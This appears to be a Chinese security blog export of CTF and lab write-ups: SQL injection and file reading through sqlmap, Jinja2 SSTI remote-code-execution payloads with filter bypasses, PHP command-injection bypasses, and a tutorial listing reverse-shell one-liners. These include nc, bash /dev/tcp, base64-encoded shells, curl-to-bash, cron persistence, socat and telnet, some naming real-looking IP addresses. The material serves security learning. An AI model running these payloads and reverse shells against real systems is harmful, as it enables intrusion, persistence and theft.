Blog的页面\n\n![image-20250219194127150](../image/achieve/202411/春秋云镜/image-20250219194127150.png)\n\n先扫一下目录吧\n\n![image-20250219194424819](../image/achieve/202411/春秋云镜/image-20250219194424819.png)\n\n访问一下/single.php试一下\n\n![image-20250219194618258](../image/achieve/202411/春秋云镜/image-20250219194618258.png)\n\n参数给出来了是id，我们传一个1和1'就可以看到存在注入了\n\n传入1%27的时候出现错误回显\n\n![image-20250219194709636](../image/achieve/202411/春秋云镜/image-20250219194709636.png)\n\n直接sqlmap一把梭\n\n![image-20250219195345682](../image/achieve/202411/春秋云镜/image-20250219195345682.png)\n\n后来看到别的师傅的wp，这里还可以做一个身份的伪造，先传入/single.php?id=1然后抓包\n\n![image-20250219195320204](../image/achieve/202411/春秋云镜/image-20250219195320204.png)\n\n使用cookie参数可以绕过身份验证，添加user-agent参数可以绕过客户端验证，否则可能会被识别到明显的sqlmap客户端标识，从而导致攻击的中断\n\n当然也是可以直接手搓的(建议手搓加深印象)\n\n过滤字符:#,\n\n```\n/single.php?id=1' order by 10--+出现错误，判断字段数为10\n/single.php?id=-1' union select 1,2,3,4,5,6,7,8,9--+发现回显位置2和4\n/single.php?id=-1' union select 1,database(),3,4,5,6,7,8,9--+爆数据库\n/single.php?id=-1%27union%20select%201,2,3,group_concat(table_name),5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=%27ctf%27--+爆表名\n/single.php?id=-1%27union%20select%201,2,3,group_concat(column_name),5,6,7,8,9%20from%20information_schema.columns%20where%20table_name=%27flag%27--+爆字段名\n/single.php?id=-1%27%20union%20select%201,database(),3,group_concat(flag),5,6,7,8,9%20from%20flag--+爆数据\n```\n\n注意这里联合注入的时候需要用-1，不然找不到注入点\n\n## CVE-2022-28060\n\n### #SQL注入读取文件\n\nCVE-2022-28060 是 Victor CMS v1.0 中的一个SQL注入漏洞。该漏洞存在于 /includes/login.php 文件中的 user_name 参数。攻击者可以通过发送特制的 SQL 语句，利用这个漏洞执行未授权的数据库操作，从而访问或修改数据库中的敏感信息。\n\n**漏洞详细信息**\n\n- **漏洞类型**：SQL注入\n- **受影响的组件**：Victor CMS v1.0\n- **攻击途径**：远程攻击者可以利用该漏洞，通过发送特制的请求来执行任意的 SQL 语句。\n- **漏洞严重性**：高 (CVSS v3 基础分数：7.5)\n\n打开后在登录框随便输入然后抓包(不知道为啥开bp代理后页面就是空白的，好不容易抓到的包)\n\n![image-20250219203108253](../image/achieve/202411/春秋云镜/image-20250219203108253.png)\n\n可以看到是post请求包，直接保存请求包内容为txt文件然后用sqlmap跑一下看看需不需要伪造验证\n\n```\npython3 sqlmap.py -r 1.txt --batch\n```\n\n![image-20250219203405902](../image/achieve/202411/春秋云镜/image-20250219203405902.png)\n\n找到注入点user_name，爆一下数据库\n\n![image-20250219204730280](../image/achieve/202411/春秋云镜/image-20250219204730280.png)\n\n没有明显的flag相关的数据库名，考虑是否需要读写文件\n\n我们知道SQL注入漏洞除了可以对数据库进行数据的查询之外，还可以对的服务器的文件进行读写操作。\n\n在mysql中读取文件\n\n```\npython3 sqlmap.py --batch -D \"mysql\" --file-read \"/flag\"\n```\n\n然后cat读取文件就行\n\n![image-20250219211027136](../image/achieve/202411/春秋云镜/image-20250219211027136.png)\n\n## CVE-2024-36104\n\n### #目录遍历\n\nApache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。\n\n- 影响组件\n\nApache OFBiz是⼀个著名的电⼦商务平台，提供了创建基于最新 J2EE/ XML规范和技术标准，构建⼤中型企业级、跨平台、跨数据库、跨应⽤服务器的多层、分布式电⼦商务类WEB应⽤系统的框架。\n\n- 影响版本\n\nApache OFBiz < 18.12.14\n\n## CVE-2019-11043\n\n**漏洞描述**\n\nNginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO\n\n为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。\n\n**利用条件：**nginx配置了fastcgi_split_path_info\n\n**受影响系统：**PHP 5.6-7.x，Nginx>=0.7.31\n\n那我们先来看一下nginx.conf中的具体配置\n\n```\nlocation ~ [^/]\\.php(/|$) {\n\n ...\n\n fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n\n fastcgi_param PATH_INFO $fastcgi_path_info;\n\n fastcgi_pass   php:9000;\n\n ...\n\n}\n```\n\n解释一下\n\n`fastcgi_split_path_info ^(.+?\\.php)(/.*)$;`\n\n这一行将请求 URI 分割为两部分：\n\n- 第一个捕获组 `(.+?\\.php)` 匹配以 `.php` 结尾的最短路径，作为脚本文件名\n- 第二个捕获组 `(/.*)`匹配剩余的路径信息\n- 结果会被存储在 `$fastcgi_script_name` 和 `$fastcgi_path_info` 变量中\n\n用的是非贪婪匹配 (`+?`)，这样可以确保只匹配到第一个找到的 `.php` 文件。\n\n2. `fastcgi_param PATH_INFO $fastcgi_path_info;`\n\n这一行将 Nginx 解析出的路径信息传递给 PHP-FPM，作为 `PATH_INFO` 环境变量。PHP 可以通过 `$_SERVER['PATH_INFO']` 访问这个值。\n\n此时我们可以使用换行符（％0a）来破坏`fastcgi_split_path_info`指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。\n","tags":["春秋云镜"],"categories":["CVE"]},{"title":"web入门SSTI篇--ctfshow","url":"/2025/01/27/web入门SSTI篇-ctfshow/","content":"\n# web361\n\n## #jinja2的ssti\n\n![image-20250123181827853](../image/achieve/202411/ssti--ctfshow/image-20250123181827853.png)\n\n既然知道了漏洞是什么，那首先就是要去找到注入点\n\n但是在页面源代码和抓包里也没找到什么，扫目录也啥都没有\n\n根据hello猜测参数可能是name或者id，测试后发现是name参数\n\n![image-20250123182828976](../image/achieve/202411/ssti--ctfshow/image-20250123182828976.png)\n\n测一下ssti漏洞\n\n传入`{{10*10}}`出现100，初步判断存在ssti注入漏洞，接下来就是去拿类然后进行注入了\n\n```\n第一步，拿到当前类，也就是用__class__\n{{\"\".__class__}}\n<class 'str'>\n第二步，拿到基类，这里可以用__base__，也可以用__mro__\n{{\"\".__class__.__base__}}\n<class 'object'>\n第三步，拿到基类的子类，用__subclasses__()\n{{\"\".__class__.__base__.__subclasses__()}}\n```\n\n然后我们找<class 'os._wrap_close'>，大多数利用的是`os._wrap_close`这个类，可以执行命令，但是需要注意的是，这个类是python的标准库，所以需要在python环境下运行。\n\n然后找到这个类的下标是在132，选择一下这个类\n\n```\n{{\"\".__class__.__base__.subclasses__()[132]}}\n```\n\n找到了后面就调用里面的\n\n```\n?name={{\"\".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}} \n```\n\n解释一下这个payload\n\n```\n\"\".__class__: 获取空字符串的类，即str。\n.__bases__[0]: 获取str类的基类，即object。object是所有Python类的基类。\n.__subclasses__(): 获取object类所有的直接子类列表。\n[132]: 选择列表中的第133个子类（因为索引是从0开始的）。这个特定的子类是不确定的，因为它取决于Python的实现和可能加载的其他模块。\n.__init__: 获取该子类的初始化方法（如果存在的话）。\n.__globals__: 获取定义__init__方法的模块的全局变量字典。\n['popen']: 从全局变量字典中获取名为popen的引用。这通常指的是os.popen函数，该函数用于执行一个命令并返回一个文件对象。\n```\n\n# web362\n\n## #过滤部分数字\n\n后面在传下标时候出了问题\n\n```\n?name={{\"\".__class__.__base__.__subclasses__()[132]}}\n```\n\n![image-20250125000751747](../image/achieve/202411/ssti--ctfshow/image-20250125000751747.png)\n\n应该是数字被过滤了，我们绕过一下\n\n## 绕过数字过滤\n\n### 1.用加减乘除算式\n\n用140-8\n\n![image-20250125001200443](../image/achieve/202411/ssti--ctfshow/image-20250125001200443.png)\n\n### 2.利用subprocess.Popen()\n\n`subprocess.Popen()` 是 Python 中 `subprocess` 模块的一个类\n\n主要功能\n\n1. **启动外部程序**：可以运行外部命令或程序，无论是系统命令还是其他可执行文件。\n2. **输入输出重定向**：能够重定向子进程的标准输入、标准输出和标准错误流。\n3. **进程管理**：可以控制子进程的执行，获取其返回值，甚至在需要时终止它。\n\n基础语法结构\n\n```python\nimport subprocess\n\nprocess = subprocess.Popen(\n    args,                     # 要执行的命令及其参数\n    bufsize=-1,              # 缓冲区大小，-1表示使用系统默认\n    executable=None,         # 指定要执行的程序，默认根据 args 来确定\n    stdin=None,              # 标准输入的重定向\n    stdout=None,             # 标准输出的重定向\n    stderr=None,             # 标准错误的重定向\n    preexec_fn=None,        # Unix特有，子进程执行前调用的函数\n    close_fds=True,         # 关闭子进程的文件描述符\n    shell=False,             # 是否通过shell执行命令\n    cwd=None,                # 子进程的工作目录\n    env=None,                # 自定义的环境变量\n    universal_newlines=False,# 是否将输入输出转换为文本模式\n    startupinfo=None,        # Windows特有，用于进程启动信息\n    creationflags=0          # Windows特有，创建进程的标志\n)\n```\n\n那我们这道题的payload就是\n\n```python\n?name={{().__class__.__mro__[1].__subclasses__()[407](\"cat /flag\",shell=True,stdout=-1).communicate()[0]}}\n```\n\n其实绕过的方法就是去凑数字或者是采用其他类，这个主要是看积累了\n\n# web363\n\n## #过滤单双引号\n\n在第一步查看当前类就卡住了，一开始以为是class被过滤了，后面发现是单双引号被过滤了\n\n## 绕过单双引号过滤\n\n我们可以用括号去绕过前面的单双引号\n\n但是我们到后面调用这个popen方法的时候好像这样是绕不过去\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[popen]}}\n```\n\n我们可以用request内置对象去进行绕过\n\n## request 旁路注入\n\n通过request内置对象去得到请求的信息，从而传递参数\n\nGET方式，用request.args传递参数(GET传参)\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=ls /\n拿flag\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=cat /flag\n```\n\nPOST方式，利用request.values传递参数(POST或者GET传参)\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()}}&a=popen&b=ls /\n```\n\nCookie方式，利用request.cookies传递参数(Cookie传参)\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()}}&a=popen&b=ls /\n```\n\n# web364\n\n## #增加过滤args\n\n测试后发现是过滤了引号和args\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=ls\n```\n\n说明上一道题确实预期解是request内置对象去传参\n\nargs被过滤了，我们可以试一下post方法的values\n\n用request的values进行post传参\n\n![image-20250126165654033](../image/achieve/202411/ssti--ctfshow/image-20250126165654033.png)\n\n```\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()}}&a=popen&b=ls /\n```\n\n另外我们讲另一种方法\n\n## 用chr拼接字符\n\n```\n?name={%set%20char=config.__class__.__init__.__globals__.__builtins__.chr%}{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)).read()}}\n```\n\n# web365\n\n## #增加过滤中括号\n\n测试后发现中括号被过滤了，我们可以用使用gititem绕过\n\n## 使用\\__getitem__()绕过\n\n```\n原payload\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.values.a).read()}}&a=cat /flag\n绕过payload\n?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.popen(request.values.a).read()}}&a=cat /flag\n```\n\n也可以使用pop绕过\n\n## 使用.pop()绕过\n\n```\n原payload\n?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(request.values.a).read()}}&a=cat /flag\n绕过payload\n?name={{().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(request.values.a).read()}}&a=cat /flag\n```\n\n以上两种方法也可以结合request去使用\n\n```\ngetitem()\n?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.b)(request.values.a).read()}}&b=popen&a=cat /flag\npop()\n?name={{().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop(request.values.b)(request.values.a).read()}}&b=popen&a=cat /flag\n```\n\n# web366\n\n## #增加过滤下划线\n\n在获取基类的时候发现有过滤，但是不知道是class还是下划线\n\n绕过下划线的时候用request没成功，猜测应该是同时也过滤了中括号，那就试一下另一个方法\n\n## attr(request.values.参数)绕过\n\n```\n原payload\n{{().__class__}}\n绕过payload\n{{()|attr(request.values.a)}}&a=__class__\n().__class__ 与 ()|attr(“__class__”)是一样的效果，由于下划线被过滤，我们通过传参的方式来解决，即：()|attr(request.values.a)&a=__class__。\n```\n\n所以我们的payload就是\n\n```\n?name={{(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.h)(request.values.i)).read()}}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&e=__init__&f=__globals__&h=popen&i=ls /\n```\n\n但是这里可以看到在外头需要加括号，括号的使用是为了明确地控制调用顺序和执行上下文，尤其是在多个属性和方法调用的情况下。\n\n如果不用加括号的话，我们需要把我们的read()函数也换成前面的形式\n\n```\n?name={{()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.h)(request.values.i)|attr(request.values.j)()}}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&e=__init__&f=__globals__&h=popen&i=ls&j=read\n```\n\n# web367\n\n## #增加过滤os\n\n用366的payload能打通，后面才知道过滤了os，但是不影响我们的payload\n\n# web368\n\n## #增加过滤花括号\n\n一开始以为是过滤了括号，后面找bypass也没找到什么，后面看wp才发现是过滤了`{{}}`花括号，那我们试着绕过一下\n\n```\n用{%%}print去进行绕过\n```\n\n```\n?name={%print((()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read())%}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&e=__init__&f=__globals__&g=popen&h=cat /flag\n```\n\n使用小括号()获取基类在获取子类找到可以执行os命令的子类再去执行命令也是可以的，不过这种方法比较繁琐，我们使用lipsum获取比较快捷一点。\n\n### 通过lipsum获取os模块\n\n```\n?name={%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%}&a=__globals__&b=os&c=cat /flag\n```\n\n# web369\n\n## #增加过滤request\n\n测试发现过滤了request，前面的方法都打不通了，看wp学到了构造字符的方法\n\n```\n{% set po=dict(po=a,p=a)|join%} \n```\n\n先来解释一下这个代码，也是我们构造字符的开始\n\n1. **`{% set ... %}`**：这是 Jinja2 中的语法，用于定义一个变量。这里我们正在创建一个变量 `po`。\n2. **`dict(po=a,p=a)`**：这部分代码创建了一个字典。字典中的键是 `po` 和 `p`，它们的值都是变量 `a`\n3. **`|join`**：`join` 是一个 Jinja2 过滤器。它用于将可迭代对象（如列表或字典的值）连接成一个字符串，通常使用指定的分隔符（如果没有提供，默认是空字符串）。在这个例子中，`join` 会尝试将字典的键或值连接成一个字符串。\n\n```\n?name={% set po=dict(po=a, p=a) | join %}{%print(po)%}\n```\n\n页面回显pop，可以看出我们成功构造了pop\n\npayload\n\n```python\n?name=\n{% set po=dict(po=a,p=a)|join%}          //拼接出pop\n{% set a=(()|select|string|list)|attr(po)(24)%}         //拼接出_\n{% set ini=(a,a,dict(init=a)|join,a,a)|join%}          //拼接出__init__\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}       //拼接出__globals__\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\t\t//拼接出__getitem__\n{% set buil=(a,a,dict(builtins=a)|join,a,a)|join()%}\t\t//拼接出__builtins__\n{% set x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%}\t\t\n{% set chr=x.chr%}\t\t//使用chr类来进行RCE因为等会要ascii转字符\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\t//拼接出/flag\n{%print(x.open(file).read())%}\n```\n\n","tags":["SSTI"],"categories":["ctfshow"]},{"title":"RCE之无回显rce","url":"/2025/01/22/RCE之无回显rce/","content":"\n## 0x01前言\n\n刚好做到一个湘岚杯的题目是跟无回显rce有关的，就写篇文章去深入学习一下这个知识点\n\n在我们做题的时候或者是测试的时候，通常会有命令执行后没有回显的情况，页面不会返回我们执行的结果，而我们也不知道命令是否执行成功，这时候就是讲到我们的无回显RCE了\n\n## 0x02检验命令是否执行成功\n\n由于页面不会返回执行的结果，所以我们同时也需要检查我们的命令是否成功执行，我这里的话推荐sleep命令\n\n在Linux中sleep命令是用于指定操作系统休眠的命令，例如sleep 3的话就是让操作系统休眠3s，这个也可以作为一个测试命令是否执行的有效方法。\n\n没有回显加上命令执行的话很容易就能想到反弹shell，这也是其中的一个方法之一\n\n## 0x03反弹shell\n\n参考文章 [反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488?time__1311=n4%2BxnD0Du0YGq0KYGNnmDUrhxciBDRDR6OrYD)\n\n反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机，一旦连接成功，我们便可以在自己的机器上执行命令，仿佛直接操作目标机器的终端。(这样在一些有很多过滤的rce中也就避免了需要绕过的麻烦)\n\n反弹shell通常用于什么情况呢?\n\n- 目标机因防火墙受限，只能发送请求不能接收请求\n- 目标机端口被占用\n- 目标机位于局域网，或IP会动态变化，攻击机无法直接连接。\n- 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。\n\n当然这些都是相对于渗透测试中的，如果是在题目中的话\n\n- 过滤掉很多命令执行的函数，无法直接进行rce\n- 可以rce但是rce的结果并不会回显\n\n### 正向连接\n\n意思就是我们自己的机器直接去连接目标机器，假设我们攻击了一台机器，打开了目标机器的一个端口，然后通过目标ip:目标机器端口去连接机器，这种就相对来说比较常见，也就是正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。\n\n### 反向连接\n\n顾名思义就是反过来的了，反弹shell的情况都是不能正常利用正向连接的，要用反向连接。反向连接就是我们利用目标机器去主动连接我们的攻击机器\n\n反弹shell的方式还是蛮多的，但是具体能用哪个得根据环境来确定。比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。\n\n讲点实际的，就是反弹shell的方式\n\n### 利用netcat反弹shell\n\nNetcat(简称nc)是一款强大的网络工具，被称为\"网络界的瑞士军刀\"。它是一个简单却功能强大的命令行工具，可以用来读写网络连接，广泛用于网络调试、数据传输和服务测试等场景。\n\nNetcat支持多种协议，如UDP和TCP协议。\n\n- netcat能进行端口扫描\n\n```\nnc -zv 192.168.1.1 20-100\n```\n\n1. `-z`：扫描模式，不发送数据，仅检查端口是否开放。\n2. `-v`：启用详细信息。\n3. `192.168.1.1`：目标主机 IP。\n4. `20-100`：扫描端口范围 20 到 100。\n\n利用nc去反弹shell的命令有很多\n\n```\n远程主机开启监听端口\nnc -lvvp [port]\n目标机反弹shell\nnc -e /bin/bash [host] [port](不同版本的nc不一定支持-e参数)\n\n/bin/bash | nc [host] [port]\n\nmknod backpipe p && nc [host] [port] 0<backpipe | /bin/bash 1>backpipe\n\nnc  [host] [输入port]  |  /bin/bash  |  nc [host] [输出port]\n\nrm -f /tmp/p; mknod /tmp/p p && nc [host] [port] 0/tmp/\n\n当nc版本问题时：\nrm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc [host] [port] >/tmp/f\n```\n\n![image-20250122133603710](../image/achieve/202411/无回显RCE/image-20250122133603710.png)\n\n这里可以看到是可以成功的执行命令的\n\n### 利用bash反弹shell\n\nbash是最好用的一个反弹shell的方式了，但是不知道为什么本地测试没成功\n\n具体命令就是\n\n```\nbash -i >& /dev/tcp/[host]]/[port] 0>&1\n```\n\n先来解释一下bash反弹一句话\n\n| 命令                    | 命令详解                                                     |\n| ----------------------- | ------------------------------------------------------------ |\n| bash -i                 | 产生一个bash交互环境。                                       |\n| >&                      | 将联合符号前面的内容与后面相结合，然后一起重定向给后者。     |\n| /dev/tcp/[host]]/[port] | Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 |\n| 0>&1                    | 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 |\n\n解读过程:Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。\n\n然后我结合湘岚杯的那道题的wp发现一个base64的bash反弹一句话\n\n```\nbash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}'  //其中的base64字符是bash -i >& /dev/tcp/10.10.14.7/4444 0>&1的base64加密\n```\n\nbash反弹一句话可以根据具体的环境去进行变动，如果有关键字被过滤的话我们也可以利用这个去进行绕过\n\n或者是这种\n\n```\necho \nL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjMuMjUuMTg2LzQ0NDQgMD4mMQ== | base64 -d| \nbash\n```\n\n关于管道符\n\n在 Unix/Linux 系统中，**管道符号（`|`）** 是一个非常重要的操作符，用于将一个命令的**输出**作为另一个命令的**输入**。\n\n所以上面的payload中就是将前面的echo输出 的传递给base64 -d，然后base64 -d会将传入的编码进行解码然后传给后面的bash，bash会将解码后的命令当成shell命令执行\n\n然后关于bash反弹还有很多姿势\n\n#### curl配合bash反弹shell\n\n这里的话其实也是借助了管道符号(|)去进行的\n\n首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：\n\n```\nbash -i >& /dev/tcp/[host]/2333 0>&1\n```\n\n这个就是最常用的bash反弹一句话，然后我们开启监听端口2333\n\n然后使用curl去远程加载（提前本地开启http）\n\n```\ncurl [host]|bash\n```\n\n这个curl命令中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。\n\n#### 将反弹shell的命令写入定时任务\n\n```\n*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/[host]/2333 0>&1\n#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell\n```\n\n- Cron 表达式，表示每分钟运行一次。\n- **`*/1`**：表示每过1分钟执行一次。\n- 后面的四个 `*` 分别表示每小时、每月、每周、每天都执行。\n\n前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 `/var/spool/cron/[crontabs]/<username>` 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。\n\n### 利用Socat反弹shell\n\n和netcat功能相似，socat是Linux下的一个多功能的网络工具，直接讲payload\n\n攻击机开启本地监听\n\n```\nsocat TCP-LISTEN:2333 -\n```\n\n目标机主动连接攻击机\n\n```\nsocat tcp-connect:[host]:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane\n```\n\n### 利用Telnet反弹shell\n\n当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell\n\npayload:\n\n**攻击机开启本地监听：**\n\n```\nnc -lvvp 2333\n```\n\n**目标机主动连接攻击机：**\n\n```\nmknod a p; telnet [host] 2333 0<a | /bin/bash 1>a\n```\n\n也有一个方法是需要开启两个本地监听的\n\npayload:\n\n**攻击机需要开启两个本地监听：**\n\n```\nnc -lvvp 2333\nnc -lvvp 4000\n```\n\n**目标机主动连接攻击机：**\n\n```\ntelnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000\n```\n\n后面的话就是要讲到我们用脚本去实现反弹shell了，前面的这些方法都是我自己拿本地测试后一个个实践了的，多动手实操还是比单纯的看博客记笔记要好很多的\n","tags":["RCE之无回显rce"],"categories":["RCE之无回显rce"]},{"title":"湘岚杯XL::CTF浮现web(已做完)","url":"/2025/01/21/湘岚杯XL-CTF浮现web/","content":"\n# 0x01前言\n\n没报名，但是后面发现这个比赛的赛题挺好玩的，就浮现玩一下\n\n# 0x02赛题\n\n## 大道轮回\n\n```php\n<?php\nsession_start();\n/*\n跳出轮回的真谛开头是:XNCTF\n*/\nshow_source(__FILE__);\nerror_reporting(0);\nif (isset($_GET['sha256']) && isset($_GET['cmd'])) {\n    $sha256 = $_GET['sha256'];\n    $cmd = $_GET['cmd'];\n\n\n    if (substr(sha256($sha256), 0, 6) === '647d99') {\n        echo \"踏平坎坷成大道，斗罢艰险又出发\";\n\n        if (preg_match(\"/;|cat|flag|&nbsp;|[0-9]|$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\|%|\\x09|\\x26/i\", $cmd)) {\n            echo \"打破顽空，跳出轮回的真谛在：\";\n            system($cmd . \" > /dev/null 2>&1\");\n        } else {\n            echo \"取了真经又如何，不过是只有功的泼猴\";\n        }\n    } else {\n        echo \"是假易灭，是假难除\";\n    }\n} else {\n    echo \"你终究不是他\";\n}\n\n// SHA-256 计算函数\nfunction sha256($data) {\n    return hash('sha256', $data);\n}\n?>\n你终究不是他\n```\n\n这里的话是if嵌套，要传入一个cmd参数和一个sha256参数，sha256参数的值经过sha256哈希计算后的前六位要等于647d99，这里直接贴个脚本\n\n```\nimport hashlib#用于进行哈希运算。MD5 是一种常用的哈希算法之一。\n\nfor i in range(1,10000000000000):\n    m=hashlib.sha256(str(i).encode()).hexdigest()#计算字符串的 sha256 哈希值，并将结果转换为十六进制的字符串表示\n    if m[0:6]=='647d99':\n        print(i)#如果找到符合条件的 i，则打印该整数。\n        break\n```\n\n![image-20250121224131115](../image/achieve/202411/湘岚杯/image-20250121224131115.png)\n\n然后那个cmd之前做过，就直接写wp了\n\npayload\n\n```\ncmd=ls /;ls&sha256=3084863\ncmd=cat /Fl@@@g;ls&sha256=3084863\n```\n\n奇怪的是这里没有过滤cat\n\n![image-20250121230004571](../image/achieve/202411/楚慧杯/image-20250121230004571.png)\n\n![image-20250121233233827](../image/achieve/202411/楚慧杯/image-20250121233233827.png)\n\n## 关关难过关关过\n\n```php\n<?php\ninclude \"secret.php\";\nheader('Content-Type: text/html; charset=UTF-8');\nshow_source(__FILE__);\nerror_reporting(0);\n#听说你很懂php\nif (isset($_POST['one']) && isset($_POST['two']) && sha1((string)$_POST['one']) == md5((string)$_POST['two'])){\n    echo \"第一步out\";\n}else die(\"抱歉\");\n\n#md5(xxxx7894xxx)\nif(isset($_POST[\"14_12_45\"])){\n    if(md5($_POST[\"14_12_45\"]) === \"19cb79e80ab6d5400950c392d077cc1c\"){\n        echo \"你好棒呀\";\n        echo \"下一关:\".$top2;\n\n    }\n}\n\n抱歉\n```\n\n第一个判断句用强碰撞进行绕过\n\n```\none=aaroZmOk&two=QNKCDZO\n```\n\n这两个经过哈希计算后都是0e开头的\n\n然后md5的话只需要找到那几个未知的数字就行\n\n贴个脚本\n\n```python\nimport hashlib\n\ndef md5_hash(value):\n    return hashlib.md5(str(value).encode('utf-8')).hexdigest()\n\ntarget_md5 = \"19cb79e80ab6d5400950c392d077cc1c\"\ntext = \"7894\"\n\nfor i in range(10000):  \n    for j in range(1000):  \n        num_str = f\"{i:04d}{text}{j:03d}\"\n \n        hash_value = md5_hash(num_str)\n        if hash_value == target_md5:\n            print(f\"Found match: {num_str}\")\n            exit(0)\n\nprint(\"No match found.\")\n```\n\n所以运算的结果+payload就是\n\n```\none=aaroZmOk&&two=240610708&&14_12_45=65417894321\n```\n\n然后得到下一关的路由15d83d6f116820a5.php，访问得到\n\n```php\n <?php\n include \"secret.php\";\n header('Content-Type: text/html; charset=UTF-8');\n show_source(__FILE__);\n error_reporting(0);\n parse_str($_SERVER['QUERY_STRING']);\n if (isset($pass)) {\n \t$key = sha1($pass);\n }\n if (isset($key) && $key == 'b84eb44c485303b69630663fc2f9c050af508dda') {\n \techo \"下一关：\".$top3;\n } else {\n \tdie(\"你小汁\");\n }\n```\n\nparse_str($_SERVER['QUERY_STRING']);会把url后面的查询字符串转化成参数变量\n\n这两个语句不是嵌套语句，直接传key=b84eb44c485303b69630663fc2f9c050af508dda就行\n\n进入第三关路由b3083cc69ebf4e0b.php\n\n```php\n<?php\n include \"secret.php\";\n header('Content-Type: text/html; charset=UTF-8');\n show_source(__FILE__);\n error_reporting(0);\n echo $top4;\n if (isset($_POST['input'])) {\n $input = $_POST['input'];\n if (!preg_match('/ls|dir|nl|nc|cat|tail|\\\n [|sh|cut|strings|od|curl|ping|\\*|sort|ch|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sud\n o|more|cc|tac|less|head|\\.|\n {|}|tar|]|gcc|vi|vim|file|xxd|base64|;|date|bash|\\$|\\x00|`|env|\\?\n |wget|\"|\\'|\\|php|id|whoami|=/i', $input)) {\n system($input);\n }else{\n die(\"wk hacker\");\n }\n }\n flag在 /fllllag\n```\n\n过滤了很多东西，但是可以发现反斜杠没有过滤，我们用反斜杠去绕过就可以了\n\npayload\n\n```\ninput=l\\s\ninput=ca\\t /fllllag\n```\n\n## 